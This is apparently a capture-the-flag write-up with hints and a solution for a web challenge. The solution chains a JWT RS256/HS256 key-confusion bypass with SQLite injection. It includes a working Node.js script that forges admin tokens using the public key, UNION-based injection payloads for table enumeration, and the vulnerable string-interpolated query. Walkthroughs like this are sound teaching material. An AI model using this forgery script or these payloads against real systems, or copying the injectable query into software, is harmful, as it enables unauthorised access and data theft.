## Skills required: Auth bypass, enumeration

The forum was quite spoily, but it'll still take some effort to implement the idea.

<details>
  <summary> Hint 1: </summary>
  
  What are the immediately obvious attack vector? What stops you from using it?
</details>
<details>
  <summary> Hint 2: </summary>
  
  What is the authentication method used? Maybe it's a good time to [learn about it](https://jwt.io/introduction).
</details>
<details>
  <summary> Hint 3: </summary>
  
  How are jwt tokens processed in the application? Are there any unnecessary options? Will it make a difference?
</details>
<details>
  <summary> <b>Solution:</b> </summary>
  <br/>
  
  The SQL injection here should be painstakingly obvious:
  
``` js
db.get(`SELECT * FROM users WHERE username = '${username}'`, (err, data) => {
    if (err) return rej(err);
    res(data);
});
```
  
  Yet to access that we need to be admin, but the information is signed as a jwt token. We need to dig deeper.
  
  In the source code responsible for decoding token, both `RS256` and `HS256` can be used ([here](https://stackoverflow.com/questions/39239051/rs256-vs-hs256-whats-the-difference) are their differences) while only `RS256` is used for signing - this is definitely interesting.
  
  After some research on common JWT vulnerabilities, I learned about [Key Confusion Vulnerabilities](https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/).
  
  While RS256 is an **asymmetric** cipher with public and private keys, HS256 is a **symmetric** cipher and the secret should be kept private. This means we can now sign our payload with "publicKey" as HS256 secret and the server will happily decode it.
  
  After struggling a lot in Python, I've decided to just work in NodeJS. (Caution: sloppy code ahead)
  
``` js
const express = require('express');
const app = express();
const bodyParser = require('body-parser');
const cookieParser = require('cookie-parser');
const http = require('http');
const fetch = require('node-fetch');
const jwt = require('jsonwebtoken');

app.use(bodyParser.urlencoded({ extended: false }));
app.use(cookieParser());

const domain = "XXX"
let template;

const auth = ({username, mode}) => {
  const body = `username=${encodeURIComponent(username)}&password=test&${encodeURIComponent(mode)}=1`;
  return fetch(`http://${domain}/auth`, {
      method: 'POST',
      body,
      redirect: mode === 'register' ? 'follow' : 'manual',
      headers: {
          "Content-Type": "application/x-www-form-urlencoded"
      }
  })
}

const enter = (token) => fetch(`http://${domain}/`, {
  method: 'GET',
  headers: {
      "Cookie":`session=${token}`
  }
})

app.all('*', async (req, res) => {
  const {username} = req.query;
  if(!username) return res.send("NOT OK");
  const reg = await auth({username, mode: 'register'}); // already exists OR successfully
  if(!template){
      const login = await auth({username, mode: 'login'});
      if(/\/$/.test(login.headers.get('location'))){
          const rawCookie = login.headers.get('set-cookie');
          const token = rawCookie.replace(/;.+/,'').replace('session=','')
          const decodedToken = jwt.decode(token, {complete: true})
          template = decodedToken;
      }
  }
  template.payload.username = username
  const token = jwt.sign(template.payload, template.payload.pk);
  const enterResult = await enter(token)
  if(enterResult){
      res.send(await enterResult.text())
  }
});

app.listen(1337, () => console.log('Listening on port 1337'));
```
  
  Now it's enumeration and as always, [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/SQLite%20Injection.md) is very helpful. First, we can try `' UNION SELECT 1,2,3;--`. Note that only the result from the first statement is returned for a multi-statement SQLite query (at least for the challenge). From this we know `username` is the second column.
  
  Table enumeration with `' UNION SELECT sql, sql, sql FROM sqlite_master WHERE type='table' and tbl_name not like 'sqlite_%' limit 1 offset 0--` gives `flag_storage`. From there the flag can be found out quickly.
  
  ### Footnote:
  
  - [pyjwt](https://pyjwt.readthedocs.io/en/latest/), a Python library I tried *forbade signing token with public keys in HS256*.

</details>
